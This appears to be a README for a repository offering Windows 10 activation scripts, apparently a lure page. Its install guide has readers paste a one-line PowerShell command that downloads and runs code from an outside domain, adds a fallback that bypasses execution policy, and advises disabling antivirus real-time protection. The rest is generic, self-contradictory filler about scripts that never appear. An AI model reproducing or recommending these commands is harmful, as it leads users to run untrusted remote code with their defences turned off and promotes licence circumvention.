<div align="center">

# Win_10_activator: Open Source Microsoft Activation Scripts — Windows Automation

![preview](https://raw.githubusercontent.com/hozifasa123-collab/win10-product-activation-scripts/main/poster_0abf.svg)

[![pipeline](https://img.shields.io/badge/pipeline-success-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/stage-active-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![language](https://img.shields.io/badge/language-python-84cc16?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/pwsh-5%2B-a3e635?style=for-the-badge&labelColor=0d1117)]()

</div>

---

This repository collects automation scripts for activating Microsoft products, built around open source code and a clear, no-nonsense workflow. The scripts are intended for administrators who want a repeatable process rather than manual steps, and they run directly from the command line. Each script targets specific product versions and handles the activation sequence in a straightforward way. Review the script contents before running anything, and make sure the target machine matches the supported configurations.

## 🚀 PowerShell Install Guide

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Paste and run
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## What it does

This repository provides a set of scripts for activating Microsoft products, built around open source activation code. It targets Windows 10 editions and related Microsoft software, giving you a repeatable way to handle activation from the command line rather than clicking through a GUI.

The core workflow is simple: pick the script that matches your Windows edition, run it with administrative privileges, and the script applies the appropriate key and points it at an activation service. Scripts are organized by edition so you don't have to guess which key to use — Home, Professional, Enterprise, and Education are each covered.

Each script is self-contained. It sets the product key for the edition you selected, configures the activation endpoint, and reports back whether activation succeeded. If something fails, the script surfaces the error rather than failing silently, which makes troubleshooting straightforward.

Because everything runs as a script, you can audit it before you run it, inspect the keys and endpoints it uses, and adapt it to your environment. The scripts don't require installing a separate application or service — they rely on tools already present in Windows.

Where activation state persists, subsequent runs will detect an already-activated system and skip redundant work. This keeps repeat executions cheap and avoids unnecessary changes to a working configuration.

## Configuration

Configuration is handled inside the scripts rather than through an external config file or environment variables. Each script exposes a small set of values near the top that you can adjust before running:

- **Product edition** — set the script to match the Windows edition you are activating (Home, Professional, Enterprise, or Education). Using a key that does not match the installed edition will fail.
- **KMS server list** — the scripts try servers in order and fall back to the next entry when one is unreachable. You can reorder, trim, or extend this list to prefer servers that respond reliably on your network.
- **Retry and timeout values** — adjust how many attempts are made and how long each attempt waits before moving on. Increase these on slow or filtered connections; decrease them for faster feedback during testing.
- **Logging** — output and error logs are written alongside the script by default. Change the destination path if you want logs kept elsewhere, or silence output when running unattended.

Keep the following in mind when editing:

- Run the scripts with administrator privileges; activation commands will fail silently or return permission errors otherwise.
- Preserve the script's encoding and line endings when editing on a different platform, or the command interpreter may misread the file.
- Make a copy before changing values so you can revert to the original behavior.
- Configuration changes apply per script; there is no shared settings file, so update each script you intend to use.

## Examples

Use the scripts as a launcher, not a black box. Each entry point handles one product family and walks through key installation and server selection in sequence. Run a script, watch the console output, and confirm the reported activation status before moving on.

Basic flow for a single machine:

- Run the main script with administrator rights.
- Choose the target product from the menu.
- Let the script apply the matching key and attempt server authentication.
- Read the final status line to confirm success.

Batch use across several machines follows the same steps, with the per-machine choice looped in a wrapper script. Keep the wrapper's error handling explicit: log the exit status of each run and stop on the first failure so a single bad host doesn't mask the rest.

If you want to inspect behavior without committing a change, point the script at a test VM and use the verbose or dry-run option where available. That prints the key and server it would use, which is handy when comparing product editions or checking that a configuration file is being picked up.

Troubleshooting examples:

- Activation fails on an edition: verify the installed edition matches the key family in the configuration; mismatches are the most common cause.
- Server unreachable: the script tries the next server automatically, but if all fail, check network egress and retry later.
- Already activated system: the script reports the existing state and exits without changes.

For repeatable setups, keep your configuration overrides in one place and invoke the script with that path so the same behavior applies across machines.

## FAQ

- **Does this work on all Windows 10 editions?** It handles the common ones (Home, Pro, Enterprise, Education) by picking the matching KMS key. If your edition isn't recognized, the script will tell you instead of silently failing.

- **Do I need to be an administrator?** Yes. Activation writes to system-level licensing components, so run the script from an elevated prompt. Running it normally will just error out early.

- **Will it survive a reboot or Windows Update?** KMS-based activation typically persists, but major feature updates can reset licensing state. If activation drops, re-run the script; it's idempotent and safe to repeat.

- **Can I pick a specific KMS server instead of the built-in list?** Yes. The server list is defined in the configuration, so you can edit it to point at your own host. The script tries them in order and reports which one responded.

- **Why does it fail with a "no response" or timeout error?** That usually means the KMS hosts in the list are unreachable from your network. Try again later, check your firewall/proxy, or swap in a server you trust.

- **Is this permanent like a retail license?** No. This uses KMS, which is periodic (renewal-based). That's the nature of the method, not a bug in the script.

- **Does it modify system files or leave junk behind?** It changes licensing keys and state via the standard tools; it doesn't patch binaries. You can inspect the scripts before running them—they're plain and readable.

- **What if activation says it succeeded but Windows still shows unactivated?** Give it a moment, then check the licensing status again. Sometimes the UI lags behind; a reboot or a status re-query usually reflects the real state.

- **Can I use this on a machine I don't own or manage?** Only run it where you have the right to do so. See the disclaimer—this is your responsibility, not the script's.

- **The script errors on a specific edition or build—what now?** Confirm your exact edition and build, check that the key mapping in the configuration matches it, and capture the error text. If the edition isn't mapped, adjust the config rather than forcing a mismatched key.

## Disclaimer

This project is provided for educational and research purposes only. It demonstrates how activation scripts and KMS-based activation workflows function under the hood, using openly available source code and publicly documented key and server information.

Running these scripts modifies system licensing state. You are solely responsible for how you use them. Only use this project on systems you own or are explicitly authorized to test, and only where such use is permitted by the applicable license terms and local law. Do not use it to bypass licensing on systems you do not control or to avoid paying for software you are required to license.

The scripts come with no warranty of any kind, express or implied, including fitness for a particular purpose or non-infringement. Activation may fail, may be reverted by updates, or may leave your system in an unexpected licensing state. Back up important data and create a restore point before running anything, and test in a disposable environment first.

The authors and contributors accept no liability for any damage, data loss, licensing violations, or legal consequences arising from the use or misuse of this project. If you are unsure whether your use case is legitimate, do not run the scripts.